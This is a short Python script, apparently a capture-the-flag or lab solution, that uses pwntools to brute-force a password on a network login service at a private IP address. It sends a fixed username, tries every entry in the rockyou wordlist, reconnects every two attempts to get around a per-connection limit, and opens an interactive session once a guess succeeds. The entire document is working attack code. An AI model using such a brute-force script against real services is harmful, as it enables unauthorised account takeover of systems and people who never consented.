from pwn import *

RHOST = "10.10.126.126"
RPORT = 8000
USERNAME = "miku" #real
PASSWORD_LIST = "/usr/share/wordlists/rockyou.txt"

conn = remote(RHOST, RPORT)
conn.sendline(USERNAME.encode())

resp = conn.recvline().decode()	
with open(PASSWORD_LIST, 'r', errors="ignore") as file:
	lines = file.readlines()
	for i, password in enumerate(lines, 1):
		if i % 2 == 0:
			conn.close()
			# recreate connection
			conn = remote(RHOST, RPORT)
			conn.sendline(USERNAME.encode())
			resp = conn.recvline().decode()	
		conn.sendline(password.strip("\n").encode())
		resp = conn.recvline().decode()	
		print(f"Attempt[{i}]: {password}")
		if "Password" not in resp:
			print(f"password found: {password}")
			print(resp)
			conn.interactive()
conn.close()
